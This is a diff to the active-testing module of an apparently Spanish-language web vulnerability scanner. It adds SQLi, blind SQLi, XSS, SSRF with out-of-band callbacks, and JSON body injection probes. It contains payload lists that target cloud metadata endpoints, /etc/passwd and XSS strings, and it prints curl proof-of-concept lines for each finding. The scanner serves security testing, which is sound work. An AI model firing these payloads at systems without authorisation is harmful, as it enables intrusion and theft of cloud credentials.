@@ -1,5 +1,9 @@
 """
-modules/active.py — Pruebas activas: SQLi, XSS reflejado, Path Traversal, SSRF.
+modules/active.py — Pruebas activas: SQLi, XSS reflejado, Path Traversal, SSRF, JSON injection.
+
+SSRF usa OOB (interactsh) cuando está disponible → confirmación real sin FPs.
+Sin OOB, usa indicadores de respuesta específicos (sin localhost/127.0.0.1 genéricos).
+JSON injection prueba APIs REST con payloads en el body.
 """
 
 from __future__ import annotations
@@ -7,7 +11,9 @@ from __future__ import annotations
 import asyncio
 import hashlib
 import html
+import json as _json
 import re
+from typing import TYPE_CHECKING, Optional
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 
 from utils.http import AsyncHTTPClient
@@ -18,20 +24,36 @@ from config import (
     XSS_PAYLOADS, TRAVERSAL_PAYLOADS,
 )
 
+if TYPE_CHECKING:
+    from utils.oob import OOBClient
+
 # ─── SSRF payloads ────────────────────────────────────────────────────────────
-SSRF_PARAMS = ["url", "path", "dest", "redirect", "uri", "src", "image", "load", "fetch", "api"]
-SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
-    "http://metadata.google.internal/",            # GCP metadata
-    "http://127.0.0.1/",                           # localhost
-    "http://[::1]/",                               # IPv6 localhost
-    "file:///etc/passwd",                          # LFI via SSRF
+SSRF_PARAMS = [
+    "url", "path", "dest", "redirect", "uri", "src", "image",
+    "load", "fetch", "api", "callback", "webhook", "target", "next", "return",
 ]
+SSRF_PAYLOADS_CLOUD = [
+    "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
+    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
+]
+SSRF_PAYLOADS_BLIND = [
+    "http://{oob}/ssrf",                           # OOB HTTP
+    "http://{oob}/",
+]
+# Indicadores en respuesta para detección sin OOB (solo strings muy específicos)
 SSRF_INDICATORS = [
-    "ami-id", "instance-id", "meta-data",          # AWS
-    "computeMetadata", "project-id",               # GCP
+    "ami-id", "instance-id", "local-hostname",     # AWS metadata
+    "computeMetadata", "project-id",               # GCP metadata
     "root:x:0:0",                                  # /etc/passwd
-    "127.0.0.1", "localhost",
+    "droplet_id", "vendor_data",                   # DigitalOcean
+]
+
+# Parámetros comunes en APIs JSON para fuzzing de body
+_JSON_PARAMS = [
+    "id", "user_id", "userId", "uid", "account_id",
+    "q", "query", "search", "filter", "name", "email",
+    "token", "key", "field", "value", "data", "input",
 ]
 
 
@@ -39,11 +61,14 @@ async def run(
     client:    AsyncHTTPClient,
     url:       str,
     full_scan: bool = False,
+    oob:       "Optional[OOBClient]" = None,
+    extra_urls: Optional[list[str]] = None,
 ) -> list[Vuln]:
     """
-    Ejecuta pruebas activas: SQLi, XSS, Path Traversal y SSRF.
-    Solo en full_scan se ejecuta la suite completa.
-    Retorna lista de Vuln.
+    Ejecuta pruebas activas: SQLi, XSS, Path Traversal, SSRF y JSON injection.
+
+    oob:        OOBClient inicializado (opcional). Habilita SSRF confirmado.
+    extra_urls: URLs adicionales descubiertas por el crawler.
     """
     vulns: list[Vuln] = []
 
@@ -73,10 +98,31 @@ async def run(
     traversal_vulns = await _test_traversal(client, url, parsed, probe_params)
     vulns.extend(traversal_vulns)
 
-    # ── SSRF (solo en full_scan) ───────────────────────────────────────────────
+    # ── SSRF ─────────────────────────────────────────────────────────────────
     if full_scan:
-        ssrf_vulns = await _test_ssrf(client, url, parsed)
+        ssrf_vulns = await _test_ssrf(client, url, parsed, oob=oob)
         vulns.extend(ssrf_vulns)
+
+    # ── JSON Injection (APIs REST) ────────────────────────────────────────────
+    # Testar la URL principal + extras del crawler
+    api_targets = [url]
+    if extra_urls:
+        api_targets.extend(extra_urls[:20])  # limitar para no sobrecargar
+
+    json_vulns = await _test_json_injection(client, api_targets)
+    vulns.extend(json_vulns)
+
+    # ── Tests en URLs adicionales del crawler ─────────────────────────────────
+    if extra_urls:
+        for extra_url in extra_urls[:15]:
+            extra_parsed = urlparse(extra_url)
+            extra_params = list(parse_qs(extra_parsed.query).keys())
+            if not extra_params:
+                continue  # sin params GET, skip (el JSON injection ya los cubre)
+            # SQLi en params GET de URLs descubiertas
+            vulns.extend(await _test_sqli(client, extra_url, extra_parsed, extra_params))
+            # XSS en params GET de URLs descubiertas
+            vulns.extend(await _test_xss(client, extra_url, extra_parsed, extra_params))
 
     return vulns
 
@@ -135,7 +181,8 @@ async def _test_sqli(
                             ),
                             evidence    = (
                                 f"Payload: {payload[:80]}\n"
-                                f"Error detectado: {match.group(0)[:100] if match else ep}"
+                                f"Error detectado: {match.group(0)[:100] if match else ep}\n"
+                                f"PoC: curl '{test_url}'"
                             ),
                             fix         = (
                                 "Usar consultas parametrizadas (prepared statements). "
@@ -144,6 +191,7 @@ async def _test_sqli(
                             ),
                             ref         = "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection",
                             module      = "active",
+                            url         = url,
                         ))
                     break
 
@@ -165,35 +213,59 @@ async def _test_sqli_blind(
     probe_params: list[str],
     already_found: set[str],
 ) -> list[Vuln]:
+    """
+    Timing-based blind SQLi con baseline estadístico.
+    Los tests se ejecutan SECUENCIALMENTE por parámetro para que las mediciones
+    de tiempo sean válidas — ejecutarlos en paralelo invalida el timing.
+    """
+    import time
     vulns: list[Vuln] = []
     found: set[str]   = set()
-    sem = asyncio.Semaphore(5)
 
-    import time
+    async def _measure_baseline(param: str, samples: int = 3) -> float:
+        """Mide el tiempo de respuesta normal (mediana de N samples) para un param."""
+        times = []
+        for _ in range(samples):
+            clean_url = _inject_param(url, parsed, param, "1")
+            t0 = time.monotonic()
+            resp = await client.get(clean_url, follow=True, lax_ssl=True, body_limit=4096)
+            dt = time.monotonic() - t0
+            if resp:
+                times.append(dt)
+        if not times:
+            return 1.5
+        times.sort()
+        return times[len(times) // 2]  # mediana
 
-    async def check(param: str, payload: str, db_type: str, sleep_secs: int):
-        title = f"SQL Injection en parámetro '{param}'"
-        if title in already_found or param in found:
-            return
+    for param in probe_params[:3]:
+        title_sqli = f"SQL Injection en parámetro '{param}'"
+        if title_sqli in already_found or param in found:
+            continue
 
-        async with sem:
+        baseline = await _measure_baseline(param)
+        threshold = baseline + SQLI_BLIND_MARGIN  # debe superar baseline + margen
+
+        for payload, db_type, sleep_secs in SQLI_BLIND_PAYLOADS:
+            if param in found:
+                break
+
             test_url = _inject_param(url, parsed, param, payload)
-            
             t0 = time.monotonic()
             resp = await client.get(test_url, follow=True, lax_ssl=True, body_limit=4096)
             dt = time.monotonic() - t0
 
-            if dt < SQLI_BLIND_MARGIN:
-                return
+            # Requiere que la respuesta supere el baseline + margen Y el tiempo de sleep
+            if dt < threshold or dt < sleep_secs * 0.75:
+                continue
 
+            # Confirmación: payload con sleep=0 debe responder rápido (< baseline + 1s)
             confirm_payload = payload.replace(str(sleep_secs), "0")
             confirm_url = _inject_param(url, parsed, param, confirm_payload)
-            
             t0_conf = time.monotonic()
-            resp_conf = await client.get(confirm_url, follow=True, lax_ssl=True, body_limit=4096)
+            await client.get(confirm_url, follow=True, lax_ssl=True, body_limit=4096)
             dt_conf = time.monotonic() - t0_conf
 
-            if dt_conf < 2.0 and param not in found:
+            if dt_conf < baseline + 1.5:
                 found.add(param)
                 vulns.append(make_vuln(
                     title       = f"SQL Injection Blind (Time-Based) en parámetro '{param}'",
@@ -205,10 +277,12 @@ async def _test_sqli_blind(
                         f"Base de datos inferida: {db_type}."
                     ),
                     evidence    = (
-                        f"Payload con retraso ({sleep_secs}s): {payload}\n"
-                        f"  → Respuesta tardó {dt:.2f} segundos.\n"
-                        f"Payload de confirmación (0s): {confirm_payload}\n"
-                        f"  → Respuesta tardó {dt_conf:.2f} segundos."
+                        f"Baseline normal: {baseline:.2f}s\n"
+                        f"Payload sleep({sleep_secs}s): {payload}\n"
+                        f"  → Respuesta tardó {dt:.2f}s (esperado ≥{threshold:.2f}s)\n"
+                        f"Confirmación sleep(0s): {confirm_payload}\n"
+                        f"  → Respuesta tardó {dt_conf:.2f}s (rápido = confirmado)\n"
+                        f"PoC: curl '{test_url}'"
                     ),
                     fix         = (
                         "Usar consultas parametrizadas (prepared statements). "
@@ -217,14 +291,9 @@ async def _test_sqli_blind(
                     ),
                     ref         = "https://portswigger.net/web-security/sql-injection/blind",
                     module      = "active",
+                    url         = url,
                 ))
 
-    tasks = []
-    for param in probe_params[:3]:
-        for payload, db_type, sleep_secs in SQLI_BLIND_PAYLOADS:
-            tasks.append(check(param, payload, db_type, sleep_secs))
-
-    await asyncio.gather(*tasks)
     return vulns
 
 
@@ -292,7 +361,8 @@ async def _test_xss(
                     ),
                     evidence    = (
                         f"Payload: {payload[:80]}\n"
-                        f"Reflejado sin escape en body (HTTP {resp.status})"
+                        f"Reflejado sin escape en body (HTTP {resp.status})\n"
+                        f"PoC: curl '{test_url}'"
                     ),
                     fix         = (
                         "Sanitizar y escapar todo output HTML (htmlspecialchars en PHP, "
@@ -301,6 +371,7 @@ async def _test_xss(
                     ),
                     ref         = "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)",
                     module      = "active",
+                    url         = url,
                 ))
 
     tasks = []
@@ -370,12 +441,76 @@ async def _test_ssrf(
     client: AsyncHTTPClient,
     url: str,
     parsed,
+    oob: "Optional[OOBClient]" = None,
 ) -> list[Vuln]:
+    """
+    Detección SSRF con dos estrategias:
+    1. OOB (interactsh o webhook.site): payload único → callback confirmado → CRITICAL.
+    2. Sin OOB: indicadores específicos en respuesta (metadata cloud) → HIGH probabilístico.
+    """
     vulns: list[Vuln] = []
     found: set[str]   = set()
-    sem = asyncio.Semaphore(5)
+    sem = asyncio.Semaphore(3)
 
-    async def check(param: str, ssrf_payload: str):
+    # ── Estrategia 1: OOB ────────────────────────────────────────────────────
+    if oob and oob.available:
+        # Mapeo uid → (param, payload_url) para correlacionar callbacks
+        oob_hits: dict[str, tuple[str, str]] = {}
+
+        for param in SSRF_PARAMS[:8]:
+            payload_url = oob.new_payload(f"ssrf-{param[:4]}")
+            uid = oob.last_uid
+            oob_hits[uid] = (param, payload_url)
+
+            test_url = _inject_param(url, parsed, param, payload_url)
+            async with sem:
+                await client.get(test_url, follow=False, lax_ssl=True, body_limit=512)
+
+        # Ventana de 15s para que el servidor del target haga el callback
+        interactions = await oob.collect_all(client.session, timeout=15.0)
+
+        confirmed: set[str] = set()
+        for inter in interactions:
+            protocol = inter.get("protocol", "HTTP").upper()
+            remote   = inter.get("remote-address", "?")
+
+            for uid, (param, payload_url) in oob_hits.items():
+                if oob.uid_in_interaction(uid, inter) and param not in confirmed:
+                    confirmed.add(param)
+                    vulns.append(make_vuln(
+                        title       = f"SSRF Confirmado ({oob.backend.upper()}) en parámetro '{param}'",
+                        severity    = "CRITICAL",
+                        cvss        = 9.8,
+                        category    = "SSRF",
+                        description = (
+                            f"El parámetro '{param}' fuerza al servidor a hacer peticiones "
+                            f"externas arbitrarias — CONFIRMADO vía callback {oob.backend} ({protocol}). "
+                            "Permite acceder a metadata de cloud, servicios internos y credenciales."
+                        ),
+                        evidence    = (
+                            f"Backend OOB: {oob.backend} ({oob._srv})\n"
+                            f"Payload: {payload_url}\n"
+                            f"Callback recibido: {protocol} desde IP {remote}\n"
+                            f"PoC: curl '{_inject_param(url, parsed, param, payload_url)}'"
+                        ),
+                        fix         = (
+                            "Whitelist estricta de URLs destino permitidas. "
+                            "Bloquear rangos privados: 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x. "
+                            "AWS: habilitar IMDSv2 (requiere token). "
+                            "Deshabilitar redirecciones HTTP en el cliente HTTP del servidor."
+                        ),
+                        ref         = "https://portswigger.net/web-security/ssrf",
+                        module      = "active",
+                        url         = url,
+                    ))
+
+        return vulns  # Solo confirmados — cero FPs garantizados
+
+    # ── Estrategia 2: Indicadores en respuesta (sin OOB) ─────────────────────
+    baseline_resp = await client.get(url, follow=True, lax_ssl=True, body_limit=32768)
+    baseline_body = baseline_resp.text.lower() if baseline_resp else ""
+
+    async def check_direct(param: str, ssrf_payload: str):
         async with sem:
             test_url = _inject_param(url, parsed, param, ssrf_payload)
             resp = await client.get(test_url, follow=True, lax_ssl=True, body_limit=32768)
@@ -383,38 +518,143 @@ async def _test_ssrf(
                 return
             body_lower = resp.text.lower()
             for indicator in SSRF_INDICATORS:
-                if indicator.lower() in body_lower:
+                ind_lower = indicator.lower()
+                if ind_lower in baseline_body:
+                    continue  # ya estaba en baseline — no es nuevo
+                if ind_lower in body_lower:
                     key = f"{param}:{ssrf_payload[:30]}"
                     if key not in found:
                         found.add(key)
                         vulns.append(make_vuln(
-                            title       = f"SSRF en parámetro '{param}'",
-                            severity    = "CRITICAL",
-                            cvss        = 9.8,
+                            title       = f"SSRF Probable en parámetro '{param}'",
+                            severity    = "HIGH",
+                            cvss        = 8.6,
                             category    = "SSRF",
                             description = (
-                                f"El parámetro '{param}' permite que el servidor haga peticiones "
-                                "a recursos internos. Un atacante puede acceder a metadata de cloud, "
-                                "servicios internos o archivos del sistema."
+                                f"El parámetro '{param}' devuelve indicadores de metadata cloud "
+                                "tras inyectar una URL interna. Verificar manualmente. "
+                                "Para confirmación sin FPs: activar OOB (webhook.site o interactsh)."
                             ),
                             evidence    = (
                                 f"Payload: {ssrf_payload}\n"
-                                f"Indicador en respuesta: '{indicator}'"
+                                f"Indicador en respuesta: '{indicator}' (ausente en baseline)\n"
+                                f"PoC: curl '{test_url}'"
                             ),
-                            fix         = (
-                                "Validar y restringir URLs de destino con lista blanca. "
-                                "Bloquear peticiones a rangos IP privados (169.254.x.x, 10.x.x.x, etc.). "
-                                "Usar IMDSv2 en AWS con token requerido."
-                            ),
-                            ref         = "https://owasp.org/www-project-top-ten/2021/A10_2021-Server-Side_Request_Forgery_(SSRF)",
+                            fix         = "Whitelist de URLs. Bloquear rangos IP privados. IMDSv2 en AWS.",
+                            ref         = "https://portswigger.net/web-security/ssrf",
                             module      = "active",
+                            url         = url,
                         ))
                     break
 
     tasks = []
-    for param in SSRF_PARAMS[:5]:
-        for ssrf_payload in SSRF_PAYLOADS[:2]:
-            tasks.append(check(param, ssrf_payload))
+    for param in SSRF_PARAMS[:6]:
+        for ssrf_payload in SSRF_PAYLOADS_CLOUD:
+            tasks.append(check_direct(param, ssrf_payload))
+    await asyncio.gather(*tasks)
+    return vulns
+
+
+# ─── JSON Body Injection ──────────────────────────────────────────────────────
+
+async def _test_json_injection(
+    client: AsyncHTTPClient,
+    urls: list[str],
+) -> list[Vuln]:
+    """
+    Inyecta payloads SQLi y XSS en el body JSON de endpoints que acepten POST.
+    Prueba campos comunes (_JSON_PARAMS) con baseline comparativo.
+    """
+    vulns: list[Vuln] = []
+    found: set[str] = set()
+    sem = asyncio.Semaphore(5)
+
+    async def probe(target_url: str, param: str, payload: str, vuln_type: str):
+        async with sem:
+            # Baseline con valor limpio
+            baseline = await client.post_json(
+                target_url, {param: "test_baseline_value"}, body_limit=65536
+            )
+            if not baseline:
+                return
+
+            resp = await client.post_json(
+                target_url, {param: payload}, body_limit=65536
+            )
+            if not resp:
+                return
+
+            # Si el body es idéntico al baseline, el servidor ignoró el campo
+            if resp.body == baseline.body:
+                return
+
+            body_lower = resp.text.lower()
+            key_base = f"json:{target_url[:60]}:{param}"
+
+            if vuln_type == "sqli":
+                for ep in SQLI_ERROR_PATTERNS:
+                    if re.search(ep, body_lower, re.IGNORECASE):
+                        key = f"{key_base}:sqli"
+                        if key not in found:
+                            found.add(key)
+                            match = re.search(ep, body_lower, re.IGNORECASE)
+                            vulns.append(make_vuln(
+                                title       = f"SQLi en JSON body (campo '{param}')",
+                                severity    = "CRITICAL",
+                                cvss        = 9.8,
+                                category    = "SQL Injection",
+                                description = (
+                                    f"El campo JSON '{param}' en POST {target_url} "
+                                    "es vulnerable a SQL Injection."
+                                ),
+                                evidence    = (
+                                    f"POST {target_url}\n"
+                                    f"Body: {{{repr(param)}: {repr(payload)}}}\n"
+                                    f"Error detectado: {match.group(0)[:100] if match else ep}"
+                                ),
+                                fix         = "Usar consultas parametrizadas. Validar y tipar el input JSON.",
+                                ref         = "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection",
+                                module      = "active",
+                                url         = target_url,
+                            ))
+                        break
+
+            elif vuln_type == "xss":
+                raw_indicators = ["<script>alert", "onerror=alert", "<svg/onload", "javascript:alert"]
+                for ind in raw_indicators:
+                    if ind.lower() in body_lower:
+                        if html.escape(ind).lower() not in body_lower:
+                            key = f"{key_base}:xss"
+                            if key not in found:
+                                found.add(key)
+                                vulns.append(make_vuln(
+                                    title       = f"XSS en JSON body (campo '{param}')",
+                                    severity    = "HIGH",
+                                    cvss        = 8.1,
+                                    category    = "Cross-Site Scripting (XSS)",
+                                    description = (
+                                        f"El campo JSON '{param}' se refleja sin escapar en la respuesta."
+                                    ),
+                                    evidence    = (
+                                        f"POST {target_url}\n"
+                                        f"Body: {{{repr(param)}: {repr(payload)}}}\n"
+                                        f"Payload reflejado sin HTML-escape."
+                                    ),
+                                    fix         = "Escapar output. Implementar CSP. Validar Content-Type en requests.",
+                                    ref         = "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)",
+                                    module      = "active",
+                                    url         = target_url,
+                                ))
+                            break
+
+    tasks = []
+    sqli_payload = SQLI_PAYLOADS[0][0] if SQLI_PAYLOADS else "'"
+    xss_payload  = XSS_PAYLOADS[0] if XSS_PAYLOADS else "<script>alert(1)</script>"
+
+    for target_url in urls:
+        for param in _JSON_PARAMS[:6]:
+            tasks.append(probe(target_url, param, sqli_payload, "sqli"))
+            tasks.append(probe(target_url, param, xss_payload, "xss"))
 
     await asyncio.gather(*tasks)
     return vulns
